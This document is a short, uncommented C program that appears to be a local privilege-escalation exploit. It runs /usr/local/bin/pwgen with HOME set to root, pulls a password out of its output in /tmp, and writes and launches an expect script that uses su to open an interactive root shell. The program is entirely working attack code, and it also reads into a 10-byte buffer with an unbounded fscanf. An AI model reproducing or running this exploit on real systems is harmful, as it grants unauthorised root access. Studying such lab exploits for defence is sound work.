#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

int main()
{
  FILE * file, *script;
  char buff[10];

  file = fopen("/tmp/pwgen_pass", "w");
  fclose(file);

  putenv("HOME=root");
  system("/usr/local/bin/pwgen -w > /tmp/pwgen_pass");

  file = fopen("/tmp/pwgen_pass", "r");
  fscanf(file, "%s", buff);
  fscanf(file, "%s", buff);
  fscanf(file, "%s", buff);
  fscanf(file, "%s", buff);
  fscanf(file, "%s", buff);

  script = fopen("/tmp/exp.sh", "w");
  fprintf(script, "#!/usr/bin/expect\n");
  fprintf(script, "spawn su root\n");
  fprintf(script, "expect \"Password:\"\n");
  fprintf(script, "send \"%s\\r\"\n", buff);
  fprintf(script, "interact");
  fclose(script);

  system("chmod u+x /tmp/exp.sh");
  system("/tmp/exp.sh");

  return 0;
}
